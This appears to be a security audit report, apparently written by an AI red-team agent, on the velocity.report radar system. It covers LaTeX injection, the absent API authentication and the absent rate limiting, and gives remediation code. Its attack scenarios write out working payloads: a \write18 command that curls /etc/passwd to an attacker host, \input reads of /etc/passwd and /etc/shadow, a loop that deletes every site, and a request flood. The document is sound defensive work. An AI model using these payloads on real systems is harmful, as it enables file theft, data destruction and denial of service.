# Security Audit Report: Launch-Blocking Vulnerabilities

**Date:** 2025-11-06  
**Auditor:** Agent Malory (Security Red Team)  
**Repository:** banshee-data/velocity.report  
**Audit Scope:** Pre-launch security assessment for production deployment

---

## Executive Summary

This security audit identified **3 CRITICAL** vulnerabilities that MUST be addressed before production launch. These vulnerabilities could lead to:
- **Remote Code Execution (RCE)** via LaTeX injection
- **Unauthorized Data Access** due to missing authentication
- **Denial of Service (DoS)** via resource exhaustion

All three vulnerabilities are classified as **launch-blocking** and require immediate remediation.

---

## Critical Vulnerabilities (LAUNCH BLOCKING)

### 1. CRITICAL: LaTeX Injection in PDF Generator ⚠️ RCE RISK

**Severity:** CRITICAL (CVSS 9.8)  
**Impact:** Remote Code Execution, Arbitrary File Read/Write  
**Location:** `tools/pdf-generator/pdf_generator/core/document_builder.py`

#### Description
User-controlled input fields (`location`, `surveyor`, `contact`) are passed directly to LaTeX rendering engine via `NoEscape()` without sanitization. This allows attackers to inject arbitrary LaTeX commands.

#### Vulnerable Code
```python
# Lines 196, 222, 225-226 in document_builder.py
doc.append(NoEscape(f"\\fancyhead[R]{{ \\textit{{{location}}}}}"))
doc.append(NoEscape(f"{{\\huge \\sffamily\\textbf{{ {location}}}}}"))
surveyor_line = f"{{\\large \\sffamily Surveyor: \\textit{{{surveyor}}} \\ \\textbullet \\ \\ Contact: \\href{{mailto:{contact}}}{{{contact}}}}}"
doc.append(NoEscape(surveyor_line))
```

#### Attack Scenarios

**Scenario 1: Arbitrary File Read**
```json
{
  "location": "\\input{/etc/passwd}",
  "surveyor": "Attacker",
  "contact": "attacker@evil.com"
}
```
Result: System password file contents embedded in PDF

**Scenario 2: Arbitrary Command Execution**
```json
{
  "location": "\\immediate\\write18{curl https://attacker.com/exfiltrate?data=$(cat /etc/passwd | base64)}",
  "surveyor": "Attacker",
  "contact": "attacker@evil.com"
}
```
Result: If `--shell-escape` is enabled in LaTeX, arbitrary commands execute

**Scenario 3: Path Traversal via Include**
```json
{
  "surveyor": "\\input{../../../../../../etc/shadow}",
  "contact": "evil@attacker.com"
}
```
Result: Sensitive files read and included in PDF output

#### Attack Vector
The vulnerability can be exploited via:
1. **HTTP API:** `POST /api/generate_report` endpoint accepts these fields in JSON
2. **No Authentication:** API is completely open (see Vulnerability #2)
3. **Direct File Access:** Attacker can retrieve generated PDFs containing exfiltrated data

#### Remediation (REQUIRED)
```python
from pylatex.utils import escape_latex

# BEFORE (vulnerable):
doc.append(NoEscape(f"\\fancyhead[R]{{ \\textit{{{location}}}}}"))

# AFTER (secure):
escaped_location = escape_latex(location)
doc.append(NoEscape(f"\\fancyhead[R]{{ \\textit{{{escaped_location}}}}}"))
```

**Required Changes:**
1. Import `escape_latex` from `pylatex.utils`
2. Escape ALL user-controlled strings before passing to `NoEscape()`
3. Apply to: `location`, `surveyor`, `contact`, `start_iso`, `end_iso`
4. Add input validation to reject malicious patterns (e.g., `\\input`, `\\write18`, `\\include`)

**Validation Test:**
```python
# Test with malicious input
test_location = "Test\\input{/etc/passwd}Site"
escaped = escape_latex(test_location)
assert "\\" not in escaped or escaped.startswith("\\textbackslash")
```

---

### 2. CRITICAL: No Authentication on HTTP API ⚠️ UNAUTHORIZED ACCESS

**Severity:** CRITICAL (CVSS 9.1)  
**Impact:** Unauthorized Data Access, Data Manipulation, Privacy Breach  
**Location:** `internal/api/server.go`, all API endpoints

#### Description
The HTTP API server (port 8080) has **ZERO authentication or authorization** mechanisms. Any network-accessible attacker can:
- Read all sensor data and speed measurements
- Create/modify/delete sites
- Generate PDF reports
- Access database contents
- Trigger resource-intensive operations

#### Vulnerable Endpoints
```
No authentication required for ANY endpoint:

GET  /api/config           - System configuration
GET  /events           - All speed detection events  
GET  /api/radar_stats      - Radar statistics
GET  /api/sites            - List all monitoring sites
POST /api/sites            - Create new sites
PUT  /api/sites/{id}       - Modify site data
DEL  /api/sites/{id}       - Delete sites
POST /api/generate_report    - Generate PDF reports (triggers LaTeX)
GET  /api/sites/reports/{id}/download - Download reports
DEL  /api/sites/reports/{id} - Delete reports
```

#### Evidence
```go
// internal/api/server.go - NO authentication middleware found
func (s *Server) ServeMux() *http.ServeMux {
    mux := http.NewServeMux()
    mux.HandleFunc("/api/config", s.showConfig)
    mux.HandleFunc("/api/events", s.listEvents)
    mux.HandleFunc("/api/radar_stats", s.showRadarStats)
    // ... more endpoints, ZERO auth checks
}
```

No search results for: `auth`, `password`, `login`, `session`, `token`, `Basic`, `Bearer`

#### Attack Scenarios

**Scenario 1: Privacy Violation**
```bash
# Attacker on same network or internet-exposed server
curl http://velocity-server:8080/events
# Returns: All speed measurements with timestamps
# Privacy claim: "No PII collection" - but timing patterns can identify vehicles
```

**Scenario 2: Data Manipulation**
```bash
# Delete all monitoring sites
for site_id in $(curl http://velocity-server:8080/api/sites | jq -r '.[].id'); do
    curl -X DELETE http://velocity-server:8080/api/sites/$site_id
done
```

**Scenario 3: Combined Attack (LaTeX Injection + No Auth)**
```bash
# Step 1: Inject malicious LaTeX to read /etc/passwd
curl -X POST http://velocity-server:8080/api/generate_report \
  -H "Content-Type: application/json" \
  -d '{
    "location": "\\input{/etc/passwd}",
    "surveyor": "Attacker",
    "contact": "evil@attacker.com",
    "start_date": "2024-01-01",
    "end_date": "2024-12-31"
  }'

# Step 2: Download PDF with exfiltrated data
curl http://velocity-server:8080/api/sites/reports/1/download?file_type=pdf -o exfiltrated.pdf
```

#### Deployment Risk
If deployed to Raspberry Pi on public network (common for traffic monitoring):
- **Internet-exposed:** Router port forwarding → full access
- **Local network:** Anyone on WiFi → full access  
- **No firewall rules:** Default config → wide open

#### Remediation (REQUIRED)

**Option 1: HTTP Basic Authentication (Simplest)**
```go
// Add authentication middleware
func AuthMiddleware(next http.Handler, username, password string) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        user, pass, ok := r.BasicAuth()
        if !ok || user != username || pass != password {
            w.Header().Set("WWW-Authenticate", `Basic realm="velocity.report"`)
            http.Error(w, "Unauthorized", http.StatusUnauthorized)
            return
        }
        next.ServeHTTP(w, r)
    })
}

// Apply to all routes
mux.HandleFunc("/api/", AuthMiddleware(apiHandler, configUser, configPass))
```

**Option 2: API Key Authentication**
```go
func APIKeyMiddleware(next http.Handler, validKey string) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        key := r.Header.Get("X-API-Key")
        if key != validKey {
            http.Error(w, "Unauthorized", http.StatusUnauthorized)
            return
        }
        next.ServeHTTP(w, r)
    })
}
```

**Required Implementation:**
1. Add authentication middleware to `internal/api/server.go`
2. Accept credentials via CLI flags: `--api-user`, `--api-password`
3. Apply to ALL `/api/*` endpoints
4. Document in README.md with security warnings
5. Add to systemd service configuration

**Configuration:**
```bash
# systemd service should pass credentials
ExecStart=/usr/local/bin/velocity-report \
    --api-user="${VELOCITY_API_USER}" \
    --api-password="${VELOCITY_API_PASSWORD}"
```

---

### 3. CRITICAL: No Rate Limiting ⚠️ DoS RISK

**Severity:** HIGH (CVSS 7.5)  
**Impact:** Denial of Service, Resource Exhaustion  
**Location:** `internal/api/server.go`, all endpoints

#### Description
API endpoints have no rate limiting, allowing attackers to:
- Exhaust system resources (CPU, memory, disk)
- Cause database locks and slowdowns
- Trigger expensive PDF generation operations repeatedly
- Overwhelm the embedded system (Raspberry Pi)

#### Vulnerable Operations

**High-Cost Endpoints:**
```
POST /api/generate_report    - Spawns Python process, generates PDF, queries DB
GET  /api/radar_stats      - Aggregates database queries, calculates histograms
GET  /events           - Full table scan of event data
```

#### Attack Scenario: PDF Generation DoS
```bash
# Flood with PDF generation requests
for i in {1..1000}; do
    curl -X POST http://velocity-server:8080/api/generate_report \
      -H "Content-Type: application/json" \
      -d '{
        "start_date": "2020-01-01",
        "end_date": "2024-12-31",
        "source": "flood-attack-$i"
      }' &
done
```

**Impact:**
- 1000 concurrent Python processes spawned (`exec.Command`)
- Disk filled with PDF/ZIP files
- CPU at 100%, system unresponsive
- SQLite database locks, corrupted data possible
- Raspberry Pi thermal throttling or crash

#### Evidence
```go
// internal/api/server.go:794-798
cmd := exec.Command(
    pythonBin,
    "-m", "pdf_generator.cli.main",
    configFile,
)
// NO rate limiting, NO concurrent request limit, NO queue
```

#### Remediation (REQUIRED)

**Add Rate Limiting Middleware:**
```go
import "golang.org/x/time/rate"

type RateLimitedServer struct {
    limiter *rate.Limiter
}

func NewRateLimiter(requestsPerSecond int, burst int) *rate.Limiter {
    return rate.NewLimiter(rate.Limit(requestsPerSecond), burst)
}

func RateLimitMiddleware(next http.Handler, limiter *rate.Limiter) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        if !limiter.Allow() {
            http.Error(w, "Rate limit exceeded", http.StatusTooManyRequests)
            return
        }
        next.ServeHTTP(w, r)
    })
}
```

**Endpoint-Specific Limits:**
```go
// Global: 100 req/s
globalLimiter := NewRateLimiter(100, 200)

// PDF generation: 1 req/min (expensive operation)
pdfLimiter := NewRateLimiter(1, 2)

mux.HandleFunc("/api/generate_report", 
    RateLimitMiddleware(
        AuthMiddleware(s.generateReport, user, pass),
        pdfLimiter,
    ),
)
```

**Additional Protections:**
1. Limit concurrent PDF generation processes (use semaphore)
2. Add timeout to `exec.Command` (e.g., 2 minutes max)
3. Implement request queue for expensive operations
4. Add disk space checks before PDF generation

---

## High Severity Vulnerabilities

### 4. HIGH: Missing CORS Configuration

**Severity:** MEDIUM-HIGH (CVSS 6.5)  
**Impact:** Cross-Site Request Forgery (CSRF), unauthorized API access from web pages  
**Location:** `internal/api/server.go`

#### Description
No CORS (Cross-Origin Resource Sharing) headers configured. While this restricts browser-based access, it can be problematic if:
- Web UI served from different domain/port
- Third-party integrations needed
- Mobile apps need API access

#### Current State
```bash
$ curl -I http://localhost:8080/events
# No Access-Control-* headers present
```

#### Recommendation
Add CORS middleware with restrictive defaults:
```go
func CORSMiddleware(next http.Handler, allowedOrigins []string) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        origin := r.Header.Get("Origin")
        if slices.Contains(allowedOrigins, origin) {
            w.Header().Set("Access-Control-Allow-Origin", origin)
            w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
            w.Header().Set("Access-Control-Allow-Headers", "Content-Type, X-API-Key")
        }
        if r.Method == "OPTIONS" {
            w.WriteHeader(http.StatusNoContent)
            return
        }
        next.ServeHTTP(w, r)
    })
}
```

---

### 5. HIGH: Insufficient Input Validation

**Severity:** MEDIUM (CVSS 5.3)  
**Impact:** Data corruption, application errors  
**Location:** Multiple API endpoints

#### Examples

**Missing validation on:**
- Site name length (could cause UI issues)
- Date format validation (relies on database parsing)
- Speed limit values (negative numbers, extreme values)
- Email format in contact field
- Timezone strings (partially validated)
- Units strings (partially validated)

#### Recommendation
Add comprehensive input validation:
```go
func validateSiteInput(site *db.Site) error {
    if len(site.Name) == 0 || len(site.Name) > 200 {
        return fmt.Errorf("site name must be 1-200 characters")
    }
    if site.SpeedLimit < 0 || site.SpeedLimit > 200 {
        return fmt.Errorf("speed limit must be 0-200 mph")
    }
    if site.Latitude < -90 || site.Latitude > 90 {
        return fmt.Errorf("invalid latitude")
    }
    if site.Longitude < -180 || site.Longitude > 180 {
        return fmt.Errorf("invalid longitude")
    }
    return nil
}
```

---

## Medium Severity Issues

### 6. MEDIUM: Command Execution in PDF Generator

**Severity:** MEDIUM (CVSS 4.8)  
**Impact:** Potential command injection (mitigated by current implementation)  
**Location:** `internal/api/server.go:794-798`

#### Current Implementation
```go
cmd := exec.Command(
    pythonBin,            // From env var or hardcoded path
    "-m", "pdf_generator.cli.main",
    configFile,           // Temp file path (hardcoded structure)
)
```

#### Analysis
Currently **appears safe** because:
- `pythonBin` defaults to hardcoded path or env var (admin-controlled)
- `configFile` is generated server-side with predictable naming
- No user input in command arguments

#### Risk Factor
If future changes allow user-controlled paths, command injection possible:
```go
// DANGEROUS (example of what NOT to do):
cmd := exec.Command("sh", "-c", fmt.Sprintf("python3 -m pdf_generator.cli.main %s", userInput))
```

#### Recommendation
1. Keep current safe implementation
2. Add code comments warning against user input in command construction
3. Consider using Python library import instead of subprocess (future enhancement)

---

### 7. MEDIUM: Path Traversal Protection Gaps

**Severity:** MEDIUM (CVSS 5.5)  
**Impact:** Limited (good path validation exists, but improvements possible)  
**Location:** `internal/security/pathvalidation.go`

#### Current Protection
Good implementation exists in `security.ValidatePathWithinDirectory()`:
- Resolves absolute paths
- Checks symlinks
- Validates against safe directory

#### Used in Download Handler
```go
// internal/api/server.go:1048
if err := security.ValidatePathWithinDirectory(filePath, pdfDir); err != nil {
    log.Printf("Security: rejected download path %s: %v", filePath, err)
    w.Header().Set("Content-Type", "application/json")
    s.writeJSONError(w, http.StatusForbidden, "Invalid file path")
    return
}
```

#### Gap Identified
Path validation happens AFTER database lookup. If attacker can inject paths into database, they could potentially bypass validation by manipulating `report.Filepath` field.

#### Recommendation
1. Add path validation when CREATING reports (before DB insert)
2. Sanitize filenames to alphanumeric + allowed chars only
3. Never trust database content - always validate before file operations

```go
func sanitizeFilename(filename string) string {
    // Allow only: a-z, A-Z, 0-9, -, _, .
    reg := regexp.MustCompile("[^a-zA-Z0-9._-]")
    return reg.ReplaceAllString(filename, "_")
}
```

---

## Low Severity Issues

### 8. LOW: Missing Security Headers

**Severity:** LOW (CVSS 3.1)  
**Impact:** Browser-based attacks (XSS, clickjacking) if web UI served directly

#### Missing Headers
```
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
Content-Security-Policy: default-src 'self'
```

#### Recommendation
Add security headers middleware:
```go
func SecurityHeadersMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        w.Header().Set("X-Frame-Options", "DENY")
        w.Header().Set("X-Content-Type-Options", "nosniff")
        w.Header().Set("X-XSS-Protection", "1; mode=block")
        w.Header().Set("Referrer-Policy", "strict-origin-when-cross-origin")
        next.ServeHTTP(w, r)
    })
}
```

---

### 9. LOW: Error Message Information Disclosure

**Severity:** LOW (CVSS 2.7)  
**Impact:** Information leakage about system internals

#### Examples
```go
// internal/api/server.go:753
s.writeJSONError(w, http.StatusInternalServerError, fmt.Sprintf("Failed to write config file: %v", err))
// Leaks: File paths, permissions errors, system details
```

#### Recommendation
```go
// Log detailed error for debugging
log.Printf("Failed to write config file %s: %v", configFile, err)

// Return generic error to client
s.writeJSONError(w, http.StatusInternalServerError, "Failed to generate report")
```

---

## Dependency Security Analysis

### Python Dependencies (tools/pdf-generator/requirements.txt)

**Status:** ✅ Current versions appear up-to-date (as of requirements.txt)

**Critical packages reviewed:**
- `pylatex==1.4.2` - Latest version (no known CVEs)
- `matplotlib==3.10.7` - Recent version (no known CVEs)
- `pillow==12.0.0` - Latest version (no known CVEs)
- `requests==2.32.5` - Recent version (no known CVEs)

**Note:** The package versions in `requirements.txt` don't match those listed in the file (e.g., certifi shows as 2025.8.3 in file but 2025.10.5 was installed). This suggests the requirements file may need updating.

**Recommendation:**
```bash
cd tools/pdf-generator
pip-compile --upgrade requirements.in
```

---

### Go Dependencies (go.mod)

**Status:** ✅ Generally up-to-date

**Key dependencies:**
- `modernc.org/sqlite v1.40.0` - SQLite driver (regularly updated)
- `github.com/google/gopacket v1.1.19` - Last updated 2019 ⚠️ (consider alternatives)
- `go.bug.st/serial v1.6.4` - Serial port library (current)
- `tailscale.com v1.91.0-pre` - Pre-release version ⚠️

**Concerns:**
1. `gopacket` is old and has known issues with newer systems
2. Tailscale pre-release version in production code

**Recommendation:**
- Pin Tailscale to stable release
- Monitor gopacket for security updates (or switch to maintained fork)

---

### JavaScript Dependencies (web/package.json)

**Status:** ⚠️ Cannot verify (pnpm-lock.yaml exists but npm audit requires package-lock.json)

**Known overrides indicate previous vulnerabilities:**
```json
"overrides": {
  "cookie@<0.7.0": ">=0.7.0",      // CVE in cookie package
  "devalue@<5.3.2": ">=5.3.2"      // Prototype pollution fix
}
```

**Recommendation:**
```bash
cd web
pnpm audit
pnpm audit --fix  # Apply automatic fixes
```

---

## Privacy Analysis

### Privacy-by-Design Claims vs. Reality

**Claimed:**
> "No cameras, no license plates, no PII collection"

**Analysis:**

✅ **True:** No camera integration  
✅ **True:** No license plate recognition  
❌ **Partially False:** Timing patterns CAN re-identify vehicles

#### Privacy Concern: Vehicle Re-identification

**Scenario:**
1. Radar detects vehicle at 10:15:23 AM, speed 35 mph
2. Same vehicle detected at 10:45:15 AM, speed 38 mph
3. Timing correlation → track individual vehicles without plates

**Mitigation:**
- Add random jitter to timestamps (±30 seconds)
- Aggregate data to hourly bins only
- Delete individual events after aggregation
- Document this limitation clearly

---

## Deployment Security Recommendations

### Raspberry Pi Hardening

```bash
# 1. Firewall configuration
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow from 192.168.1.0/24 to any port 8080  # Local network only
sudo ufw enable

# 2. Disable unnecessary services
sudo systemctl disable bluetooth
sudo systemctl disable avahi-daemon

# 3. SSH hardening
sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
sudo systemctl restart sshd

# 4. Automatic security updates
sudo apt install unattended-upgrades
sudo dpkg-reconfigure -plow unattended-upgrades
```

### Service Configuration

```ini
[Service]
# Run as non-root user
User=velocity
Group=velocity

# Security hardening
NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=/var/lib/velocity-report

# Resource limits
LimitNOFILE=1024
LimitNPROC=64
MemoryLimit=512M
CPUQuota=50%
```

---

## Testing Recommendations

### Security Test Suite (MUST IMPLEMENT)

```bash
# 1. LaTeX Injection Tests
curl -X POST http://localhost:8080/api/generate_report \
  -H "Content-Type: application/json" \
  -d '{"location": "\\input{/etc/passwd}", ...}'
# Expected: Escaped output in PDF, no file content

# 2. Authentication Tests
curl http://localhost:8080/events
# Expected: 401 Unauthorized (after fix)

# 3. Rate Limiting Tests
for i in {1..200}; do curl http://localhost:8080/api/radar_stats & done
# Expected: 429 Too Many Requests (after fix)

# 4. Path Traversal Tests
curl "http://localhost:8080/api/sites/reports/1/download?file_type=../../etc/passwd"
# Expected: 403 Forbidden
```

### Automated Security Testing

Add to CI/CD pipeline:
```yaml
# .github/workflows/security.yml
- name: Go Security Scan
  run: |
    go install github.com/securego/gosec/v2/cmd/gosec@latest
    gosec ./...

- name: Python Security Scan
  run: |
    pip install bandit safety
    bandit -r tools/pdf-generator/
    safety check

- name: Dependency Audit
  run: |
    go mod verify
    pnpm audit
```

---

## Remediation Priority Matrix

| Priority | Vulnerability | Effort | Risk if Not Fixed |
|----------|--------------|--------|-------------------|
| **P0** | LaTeX Injection (#1) | 2 hours | **RCE** |
| **P0** | No Authentication (#2) | 4 hours | **Full compromise** |
| **P0** | No Rate Limiting (#3) | 3 hours | **DoS** |
| P1 | CORS Configuration (#4) | 1 hour | Limited |
| P1 | Input Validation (#5) | 3 hours | Data corruption |
| P2 | Security Headers (#8) | 30 min | Browser attacks |
| P3 | Error Messages (#9) | 1 hour | Info leak |

**Total Critical Remediation Time:** ~9 hours  
**Total Full Remediation Time:** ~14.5 hours

---

## Conclusion

The velocity.report system has **3 CRITICAL vulnerabilities** that make it **UNSUITABLE FOR PRODUCTION DEPLOYMENT** without immediate fixes:

1. ✅ **Good Path Validation** - Existing security module works well
2. ❌ **LaTeX Injection** - Must escape all user input
3. ❌ **No Authentication** - Must add API authentication
4. ❌ **No Rate Limiting** - Must prevent resource exhaustion

**Recommendation:** **DO NOT LAUNCH** until P0 vulnerabilities are fixed and tested.

---

## Security Contact

For security issues, contact: [REDACTED - Add security contact email]

Report generated: 2025-11-06 by Agent Malory
